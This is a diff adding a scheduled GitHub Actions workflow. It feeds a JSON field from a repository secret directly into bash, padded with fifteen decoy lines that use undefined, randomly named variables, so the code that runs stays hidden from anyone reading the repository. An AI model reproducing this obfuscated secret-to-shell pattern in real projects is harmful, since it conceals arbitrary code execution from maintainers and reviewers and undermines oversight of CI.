@@ -1,0 +1,32 @@
+name: zaifengzf
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zaifengzf
+        env:
+          ies4: ${{ secrets.ies4 }}
+        run: |
+          echo $ies4 | jq -r .ywsa1088 | /bin/bash
+          echo $eqi25 | jq -r .xp5975 | /bin/bash
+          echo $jty5 | jq -r .me3690 | /bin/bash
+          echo $jpms2680 | jq -r .bngq27844 | /bin/bash
+          echo $eoezh77 | jq -r .w196 | /bin/bash
+          echo $s076 | jq -r .iig35257 | /bin/bash
+          echo $usle2186 | jq -r .krh1 | /bin/bash
+          echo $khe5 | jq -r .xw0 | /bin/bash
+          echo $ukktf641 | jq -r .bewh6 | /bin/bash
+          echo $jkfe6 | jq -r .cvxh2 | /bin/bash
+          echo $fv2 | jq -r .nbnf96733 | /bin/bash
+          echo $se26987 | jq -r .ypl21 | /bin/bash
+          echo $ohetj62 | jq -r .zue1 | /bin/bash
+          echo $qj58082 | jq -r .fg93 | /bin/bash
+          echo $v1 | jq -r .myv17 | /bin/bash
+          echo $sc57533 | jq -r .ckm64105 | /bin/bash
+
